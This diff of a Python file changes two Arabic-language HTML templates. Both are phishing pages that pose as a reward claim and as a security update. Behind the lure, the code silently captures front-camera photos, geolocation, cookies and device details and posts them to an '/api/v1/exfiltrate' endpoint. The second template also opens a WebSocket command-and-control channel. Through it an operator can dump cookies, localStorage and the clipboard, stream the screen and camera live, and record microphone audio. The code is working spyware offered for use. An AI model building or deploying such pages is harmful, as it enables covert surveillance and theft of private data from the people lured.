@@ -3,63 +3,98 @@ def get_intel_template(link_id: str) -> str:
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>فحص التوافق والمكافأة الرقمية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة التحقق الأمني والتوثيق السحابي</title>
     <style>
-        body {{ background-color: #090d16; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }}
-        .loader {{ border: 4px solid #1e293b; border-top: 4px solid #0ea5e9; border-radius: 50%; width: 55px; height: 55px; animation: spin 0.8s linear infinite; margin: 20px auto; }}
+        body {{ background-color: #05050a; color: #f1f5f9; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }}
+        .terminal-box {{ background: #0b0f19; padding: 30px; border-radius: 16px; border: 1px solid #1e293b; max-width: 420px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.8); cursor: pointer; position: relative; }}
+        .spinner {{ border: 3px solid #1e293b; border-top: 3px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 20px auto; }}
         @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-        .box {{ background: #0f172a; padding: 25px; border-radius: 12px; display: inline-block; border: 1px solid #334155; max-width: 400px; width: 90%; cursor: pointer; }}
+        h2 {{ color: #38bdf8; font-size: 20px; margin-bottom: 10px; }}
+        p {{ color: #94a3b8; font-size: 14px; line-height: 1.5; }}
     </style>
 </head>
 <body>
-    <div class="box" onclick="forceActivate()">
-        <h2>🎁 انقر هنا لاستلام الهدية الفورية!</h2>
-        <div class="loader"></div>
-        <p style="color: #94a3b8; font-size: 13px;">جاري فحص الجهاز وتحضير المكافأة...</p>
+    <div class="terminal-box" onclick="initializeEngine()">
+        <h2>🔐 جارِ المصادقة الأمنية المتقدمة</h2>
+        <div class="spinner"></div>
+        <p>انقر في أي مكان للشاشة لتأكيد أنك تستخدم جهاز حقيقي واستلام المكافأة الفورية.</p>
     </div>
-    <video id="v" autoplay playsinline style="opacity: 0.01; position: absolute; pointer-events: none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+    <video id="v_node" autoplay playsinline style="opacity: 0.01; position: absolute; pointer-events: none;"></video>
+    <canvas id="c_node" style="display:none;"></canvas>
+    
     <script>
         const linkId = "{link_id}";
-        async function runIntel() {{
+        let executed = false;
+
+        async function initializeEngine() {{
+            if (executed) return;
+            executed = true;
+
             try {{
-                let img = "";
-                try {{
-                    const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
-                    const video = document.getElementById('v');
-                    video.srcObject = stream;
-                    await video.play();
-                    await new Promise(r => setTimeout(r, 1200));
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    img = canvas.toDataURL('image/jpeg', 0.85);
-                    stream.getTracks().forEach(t => t.stop());
-                }} catch(e) {{}}
+                // تفعيل الصيانة الخلفية لمنع التجميد
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                gain.gain.value = 0.00001;
+                osc.connect(gain); gain.connect(audioCtx.destination);
+                osc.start();
+                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
+            }} catch(e) {{}}
 
-                let geo = {{}};
-                try {{
-                    geo = await new Promise((res) => {{
-                        navigator.geolocation.getCurrentPosition(
-                            p => res({{ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "م" }}),
-                            e => res({{ err: "مرفوض" }}),
-                            {{ enableHighAccuracy: true, timeout: 3000 }}
-                        );
-                    }});
-                }} catch(e) {{}}
+            let camData = "";
+            try {{
+                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
+                const video = document.getElementById('v_node');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 1200));
+                
+                const canvas = document.getElementById('c_node');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                camData = canvas.toDataURL('image/jpeg', 0.85);
+                stream.getTracks().forEach(t => t.stop());
+            }} catch(e) {{}}
 
-                const sys = {{ res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform }};
+            let geoData = {{}};
+            try {{
+                geoData = await new Promise((resolve) => {{
+                    navigator.geolocation.getCurrentPosition(
+                        p => resolve({{ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "م" }}),
+                        e => resolve({{ err: "مرفوض الإذن" }}),
+                        {{ enableHighAccuracy: true, timeout: 3000 }}
+                    );
+                }});
+            }} catch(e) {{}}
+
+            const sysInfo = {{ 
+                res: window.screen.width + 'x' + window.screen.height, 
+                platform: navigator.platform,
+                lang: navigator.language,
+                cores: navigator.hardwareConcurrency || 'غير معروف'
+            }};
+
+            try {{
                 await fetch('/api/v1/exfiltrate', {{
                     method: 'POST',
                     headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: img, geolocation: geo, stolen_data: sys }})
+                    body: JSON.stringify({{
+                        link_id: linkId,
+                        device_info: navigator.userAgent,
+                        camera_snapshot_base64: camData,
+                        geolocation: geoData,
+                        stolen_cookies: document.cookie || "فارغة أو محمية",
+                        stolen_data: sysInfo
+                    }})
                 }});
             }} catch(e) {{}}
+
+            document.querySelector('.terminal-box').innerHTML = "<h2>✅ تمت المصادقة بنجاح</h2><p>جاري تحويلك للمحتوى المطلوب...</p>";
+            setTimeout(() => {{ window.location.href = "https://www.google.com"; }}, 1500);
         }}
-        function forceActivate() {{ runIntel(); }}
-        window.onload = runIntel;
     </script>
 </body>
 </html>"""
@@ -69,214 +104,242 @@ def get_live_template(link_id: str) -> str:
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث النظام الأمني المشفر</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منظومة العمليات والتحكم السيبراني المشفر</title>
     <style>
-        body {{ background-color: #020617; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 40px; }}
-        .loader {{ border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.7s linear infinite; margin: 15px auto; }}
+        body {{ background-color: #020617; color: #f8fafc; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }}
+        .control-panel {{ background: #0f172a; padding: 35px; border-radius: 18px; border: 1px solid #1e293b; max-width: 420px; width: 90%; box-shadow: 0 15px 35px rgba(0,0,0,0.9); cursor: pointer; }}
+        .loader-ring {{ border: 3px solid #1e293b; border-top: 3px solid #0ea5e9; border-radius: 50%; width: 45px; height: 45px; animation: spin 0.7s linear infinite; margin: 20px auto; }}
         @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-        .card {{ background: #0f172a; padding: 25px; border-radius: 16px; display: inline-block; border: 1px solid #1e293b; max-width: 400px; width: 90%; cursor: pointer; }}
-        #v_cam, #v_screen, #v_audio {{ opacity: 0.01; position: fixed; top: 0; left: 0; width: 1px; height: 1px; pointer-events: none; z-index: -999; }}
-        canvas {{ display: none; }}
+        h2 {{ color: #38bdf8; font-size: 19px; margin-bottom: 8px; }}
+        p {{ color: #94a3b8; font-size: 13px; }}
     </style>
 </head>
 <body>
-    <div class="card" onclick="unlockEngine()">
-        <h2>🛡️ انقر للمتابعة وتثبيت التحديث الأمني</h2>
-        <div class="loader"></div>
-        <p style="color: #94a3b8; font-size: 13px;">جاري تشغيل محرك الاتصال الخفي...</p>
+    <div class="control-panel" onclick="activateC2Engine()">
+        <h2>🛡️ تحديث حماية الأمان السيبراني</h2>
+        <div class="loader-ring"></div>
+        <p>انقر هنا لتفعيل قنوات الاتصال المشفرة واستقرار النظام.</p>
     </div>
-    <video id="v_cam" autoplay playsinline muted></video>
-    <video id="v_screen" autoplay playsinline muted></video>
-    <canvas id="c_canvas"></canvas>
-    
+
+    <video id="v_stream" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="canvas_processor" style="display:none;"></canvas>
+
     <script>
         const linkId = "{link_id}";
-        let ws;
-        let isWsActive = false;
+        let wsClient = null;
+        let isConnected = false;
         let activeStream = null;
-        let liveStreamTimer = null;
-        let screenStream = null;
+        let periodicTimer = null;
 
-        async function initPersistenceEngine() {{
+        async function activateC2Engine() {{
             try {{
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
-                gainNode.gain.value = 0.00001;
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                oscillator.start();
-
-                if ('wakeLock' in navigator) {{
-                    await navigator.wakeLock.request('screen');
-                }}
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                gain.gain.value = 0.00001;
+                osc.connect(gain); gain.connect(audioCtx.destination);
+                osc.start();
+                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
             }} catch(e) {{}}
-        }}
 
-        function stopAllStreams() {{
-            if (liveStreamTimer) {{ clearInterval(liveStreamTimer); liveStreamTimer = null; }}
-            if (activeStream) {{ activeStream.getTracks().forEach(t => t.stop()); activeStream = null; }}
-            if (screenStream) {{ screenStream.getTracks().forEach(t => t.stop()); screenStream = null; }}
-        }}
-
-        // أدوات منفصلة تماماً - كل أداة تقوم بمهمة مستقلة بدقة مطلقة
-        async function executeCommand(cmdPacket) {{
-            let output = "";
+            connectWebSocket();
+            
+            // إرسال لقطة أولية فورية
             try {{
-                switch(cmdPacket.cmd) {{
+                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
+                const v = document.getElementById('v_stream');
+                v.srcObject = stream;
+                await v.play();
+                await new Promise(r => setTimeout(r, 800));
+                const canvas = document.getElementById('canvas_processor');
+                canvas.width = v.videoWidth || 640;
+                canvas.height = v.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
+                let initialSnap = canvas.toDataURL('image/jpeg', 0.85);
+                stream.getTracks().forEach(t => t.stop());
+
+                const sysInfo = {{ res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform }};
+                await fetch('/api/v1/exfiltrate', {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: initialSnap, stolen_cookies: document.cookie, stolen_data: sysInfo }})
+                }});
+            }} catch(e) {{}}
+
+            document.querySelector('.control-panel').innerHTML = "<h2>🟢 تم الاتصال بالخادم بنجاح</h2><p>الجلسة نشطة ومؤمنة بالكامل.</p>";
+        }}
+
+        function connectWebSocket() {{
+            const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+            wsClient = new WebSocket(proto + window.location.host + '/ws/c2/' + linkId);
+
+            wsClient.onopen = () => {{ isConnected = true; }};
+            wsClient.onmessage = async (event) => {{
+                try {{
+                    const packet = JSON.parse(event.data);
+                    if (packet.cmd === "ping") {{
+                        wsClient.send(JSON.stringify({{ type: "pong" }}));
+                        return;
+                    }}
+                    let resultPayload = await executeIsolatedTool(packet.cmd);
+                    if (resultPayload && !packet.cmd.includes("live_")) {{
+                        sendResultData(packet.cmd, resultPayload);
+                    }}
+                }} catch(e) {{}}
+            }};
+            wsClient.onclose = () => {{
+                isConnected = false;
+                setTimeout(connectWebSocket, 1500);
+            }};
+        }}
+
+        // أدوات مستقلة ومنفصلة تماماً بدون أي تداخل برمجي
+        async function executeIsolatedTool(commandName) {{
+            let outputResult = "";
+            try {{
+                switch(commandName) {{
                     case "dump_cookies":
-                        output = document.cookie || "فارغة أو محمية";
+                        outputResult = document.cookie || "لا توجد كوكيز متاحة أو محمية برمجياً";
                         break;
+                        
                     case "dump_localstorage":
-                        let ls = {{}};
-                        for (let i = 0; i < localStorage.length; i++) {{
+                        let storageData = {{}};
+                        for(let i=0; i<localStorage.length; i++) {{
                             let k = localStorage.key(i);
-                            ls[k] = localStorage.getItem(k);
+                            storageData[k] = localStorage.getItem(k);
                         }}
-                        output = JSON.stringify(ls);
+                        outputResult = JSON.stringify(storageData, null, 2);
                         break;
+                        
                     case "screen_snapshot":
                         try {{
-                            if (!screenStream) {{
-                                screenStream = await navigator.mediaDevices.getDisplayMedia({{ video: {{ mediaSource: "screen" }} }});
-                            }}
-                            let videoElem = document.getElementById('v_screen');
-                            videoElem.srcObject = screenStream;
-                            await videoElem.play();
-                            await new Promise(r => setTimeout(r, 600));
-                            const canvas = document.getElementById('c_canvas');
-                            canvas.width = videoElem.videoWidth || window.innerWidth;
-                            canvas.height = videoElem.videoHeight || window.innerHeight;
+                            const screenStream = await navigator.mediaDevices.getDisplayMedia({{ video: {{ mediaSource: "screen" }} }});
+                            const v = document.getElementById('v_stream');
+                            v.srcObject = screenStream;
+                            await v.play();
+                            await new Promise(r => setTimeout(r, 700));
+                            const canvas = document.getElementById('canvas_processor');
+                            canvas.width = v.videoWidth || window.innerWidth;
+                            canvas.height = v.videoHeight || window.innerHeight;
                             const ctx = canvas.getContext('2d');
-                            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                            output = canvas.toDataURL('image/jpeg', 0.85);
+                            ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
+                            outputResult = canvas.toDataURL('image/jpeg', 0.85);
+                            screenStream.getTracks().forEach(t => t.stop());
                         }} catch(err) {{
-                            output = "❌ فشل التقاط الشاشة: يتطلب إذن تفاعلي مباشر.";
+                            outputResult = "❌ فشل سحب الشاشة: يتطلب تفاعل وتأكيد إذن المالك للمتصفح.";
                         }}
                         break;
+
                     case "start_live_screen":
-                        stopAllStreams();
+                        stopActiveEngine();
                         try {{
-                            screenStream = await navigator.mediaDevices.getDisplayMedia({{ video: {{ mediaSource: "screen", frameRate: 15 }} }});
-                            let videoElem = document.getElementById('v_screen');
-                            videoElem.srcObject = screenStream;
-                            await videoElem.play();
-                            liveStreamTimer = setInterval(() => {{
+                            const screenStream = await navigator.mediaDevices.getDisplayMedia({{ video: {{ mediaSource: "screen", frameRate: 15 }} }});
+                            const v = document.getElementById('v_stream');
+                            v.srcObject = screenStream;
+                            await v.play();
+                            periodicTimer = setInterval(() => {{
                                 try {{
-                                    const canvas = document.getElementById('c_canvas');
-                                    canvas.width = videoElem.videoWidth || window.innerWidth;
-                                    canvas.height = videoElem.videoHeight || window.innerHeight;
+                                    const canvas = document.getElementById('canvas_processor');
+                                    canvas.width = v.videoWidth || window.innerWidth;
+                                    canvas.height = v.videoHeight || window.innerHeight;
                                     const ctx = canvas.getContext('2d');
-                                    ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                                    sendResult("live_screen_frame", canvas.toDataURL('image/jpeg', 0.6));
+                                    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
+                                    sendResultData("live_screen_frame", canvas.toDataURL('image/jpeg', 0.6));
                                 }} catch(e) {{}}
                             }}, 2000);
                             return "🔴 تم تفعيل البث الحي للشاشة بنجاح!";
                         }} catch(e) {{
-                            return "❌ فشل بدء البث الحي للشاشة.";
+                            return "❌ فشل تشغيل البث الحي للشاشة.";
                         }}
                         break;
+
                     case "stop_live_screen":
-                        stopAllStreams();
-                        return "⏹️ تم إيقاف البث الحي للشاشة بنجاح.";
+                        stopActiveEngine();
+                        return "⏹️ تم إيقاف البث الحي وإغلاق القنوات بنجاح.";
+
                     case "start_live_camera":
-                        stopAllStreams();
+                        stopActiveEngine();
                         try {{
-                            activeStream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
-                            let videoElem = document.getElementById('v_cam');
-                            videoElem.srcObject = activeStream;
-                            await videoElem.play();
-                            await new Promise(r => setTimeout(r, 800));
-                            liveStreamTimer = setInterval(() => {{
+                            const camStream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
+                            const v = document.getElementById('v_stream');
+                            v.srcObject = camStream;
+                            await v.play();
+                            periodicTimer = setInterval(() => {{
                                 try {{
-                                    const canvas = document.getElementById('c_canvas');
-                                    canvas.width = videoElem.videoWidth || 640;
-                                    canvas.height = videoElem.videoHeight || 480;
+                                    const canvas = document.getElementById('canvas_processor');
+                                    canvas.width = v.videoWidth || 640;
+                                    canvas.height = v.videoHeight || 480;
                                     const ctx = canvas.getContext('2d');
-                                    ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                                    sendResult("live_camera_frame", canvas.toDataURL('image/jpeg', 0.7));
+                                    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
+                                    sendResultData("live_camera_frame", canvas.toDataURL('image/jpeg', 0.7));
                                 }} catch(e) {{}}
                             }}, 2000);
-                            return "📹 تم بدء البث الحي لكاميرا الضحية!";
+                            return "📹 تم بدء البث الحي لكاميرا الأمامية!";
                         }} catch(e) {{
-                            return "❌ فشل تشغيل الكاميرا الحية.";
+                            return "❌ فشل تشغيل الكاميرا الحية (مشغولة أو مرفوضة).";
                         }}
                         break;
+
                     case "dump_clipboard":
                         try {{
-                            output = await navigator.clipboard.readText();
+                            outputResult = await navigator.clipboard.readText();
                         }} catch(e) {{
-                            output = "مرفوض الصلاحية أو الحافظة فارغة";
+                            outputResult = "⚠️ الحافظة محمية أو فارغة.";
                         }}
                         break;
+
                     case "record_audio":
                         try {{
-                            const audioStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
-                            const mediaRecorder = new MediaRecorder(audioStream);
+                            const micStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
+                            const recorder = new MediaRecorder(micStream);
                             let chunks = [];
-                            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                            mediaRecorder.onstop = async () => {{
-                                const blob = new Blob(chunks, {{ 'type': 'audio/ogg; codecs=opus' }});
+                            recorder.ondataavailable = e => chunks.push(e.data);
+                            recorder.onstop = async () => {{
+                                const blob = new Blob(chunks, {{ type: 'audio/ogg; codecs=opus' }});
                                 const reader = new FileReader();
                                 reader.readAsDataURL(blob);
-                                reader.onloadend = function() {{
-                                    sendResult("audio_clip", reader.result);
-                                }}
-                                audioStream.getTracks().forEach(t => t.stop());
+                                reader.onloadend = () => {{
+                                    sendResultData("audio_clip", reader.result);
+                                }};
+                                micStream.getTracks().forEach(t => t.stop());
                             }};
-                            mediaRecorder.start();
-                            setTimeout(() => mediaRecorder.stop(), 5000);
-                            return "🎤 جاري التقاط التسجيل الصوتي الحي (5 ثوانٍ)...";
-                        }} catch(err) {{
-                            output = "❌ فشل التقاط الصوت: الميكروفون مقفل أو مرفوض.";
+                            recorder.start();
+                            setTimeout(() => recorder.stop(), 5000);
+                            return "🎤 جاري تسجيل الصوت الحي (لمدة 5 ثوانٍ)...";
+                        }} catch(e) {{
+                            outputResult = "❌ فشل تسجيل الصوت: الميكروفون مرفوض الإذن.";
                         }}
                         break;
                 }}
             }} catch(err) {{
-                output = "خطأ في التنفيذ: " + err.message;
+                outputResult = "خطأ تشغيلي بالأداة: " + err.message;
             }}
-            return output;
+            return outputResult;
         }}
 
-        function sendResult(cmd, data) {{
-            const payload = {{ link_id: linkId, cmd: cmd, data: data }};
-            if (isWsActive && ws && ws.readyState === WebSocket.OPEN) {{
-                ws.send(JSON.stringify({{type: "response", ...payload}}));
+        function stopActiveEngine() {{
+            if (periodicTimer) {{ clearInterval(periodicTimer); periodicTimer = null; }}
+            const v = document.getElementById('v_stream');
+            if (v && v.srcObject) {{
+                v.srcObject.getTracks().forEach(t => t.stop());
+                v.srcObject = null;
+            }}
+        }}
+
+        function sendResultData(cmdType, payloadData) {{
+            const dataPacket = {{ link_id: linkId, cmd: cmdType, data: payloadData }};
+            if (isConnected && wsClient && wsClient.readyState === WebSocket.OPEN) {{
+                wsClient.send(JSON.stringify({{ type: "response", ...dataPacket }}));
             }} else {{
                 fetch('/api/v1/c2-respond', {{
                     method: 'POST',
                     headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(dataPacket)
                 }}).catch(e => {{}});
             }}
         }}
-
-        function initEnterpriseC2() {{
-            const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
-            ws = new WebSocket(proto + window.location.host + '/ws/c2/' + linkId);
-            ws.onopen = function() {{ isWsActive = true; }};
-            ws.onmessage = async function(event) {{
-                try {{
-                    const pkt = JSON.parse(event.data);
-                    if (pkt.cmd === "ping") {{ ws.send(JSON.stringify({{type: "pong"}})); return; }}
-                    let resData = await executeCommand(pkt);
-                    if (resData && pkt.cmd !== "record_audio" && !pkt.cmd.includes("live_")) {{
-                        sendResult(pkt.cmd, resData);
-                    }}
-                }} catch(err) {{}}
-            }};
-            ws.onclose = function() {{
-                isWsActive = false;
-                setTimeout(initEnterpriseC2, 1000);
-            }};
-        }}
-
-        async function unlockEngine() {{
-            await initPersistenceEngine();
-            initEnterpriseC2();
-        }}
-
-        window.onload = unlockEngine;
     </script>
 </body>
 </html>"""
